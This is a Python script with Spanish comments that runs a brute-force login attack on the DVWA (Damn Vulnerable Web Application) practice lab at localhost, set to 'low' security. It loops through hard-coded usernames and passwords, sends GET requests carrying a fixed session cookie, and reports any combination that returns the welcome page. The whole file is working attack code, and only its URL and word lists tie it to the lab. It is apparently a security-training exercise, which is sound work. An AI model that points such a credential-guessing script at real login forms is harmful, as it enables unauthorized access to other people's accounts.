import requests

# Configuraciones
url = 'http://127.0.0.1:4280/vulnerabilities/brute/'  # URL del formulario de autenticación
usuarios = ['admin', 'pablo', 'smithy']  # Lista de nombres de usuario a probar
contraseñas = ['password', 'letmein', 'password']  # Lista de contraseñas a probar

# Crear una sesión de requests para manejar cookies
session = requests.Session()

# Definir las cookies necesarias (incluyendo PHPSESSID)
cookies = {
    'PHPSESSID': 'ec7e616a13b5bfad0fc53606dcbe9d22',  # ID de sesión correcto
    'security': 'low'  # Nivel de seguridad de DVWA
}

# Definir las cabeceras HTTP
cabeceras = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Connection': 'keep-alive',
    'Referer': 'http://127.0.0.1:4280/vulnerabilities/brute/',
    'Upgrade-Insecure-Requests': '1'
}

# Función para intentar el inicio de sesión con el método GET
def intentar_login(usuario, contraseña):
    # Construir la URL con los parámetros username y password
    params = {
        'username': usuario,
        'password': contraseña,
        'Login': 'Login'
    }

    # Enviar la solicitud GET con las cookies y las cabeceras configuradas
    respuesta = session.get(url, headers=cabeceras, cookies=cookies, params=params)

    # Verificar si la respuesta contiene el mensaje de éxito
    if "Welcome to the password protected area" in respuesta.text:
        print(f"[+] ¡Éxito! Usuario: {usuario} | Contraseña: {contraseña}")
        return True
    return False

# Realizar ataque de fuerza bruta
for usuario in usuarios:
    for contraseña in contraseñas:
        print(f"[-] Intentando con Usuario: {usuario} | Contraseña: {contraseña}")
        if intentar_login(usuario, contraseña):
            break  # Detener si se encuentra una combinación válida
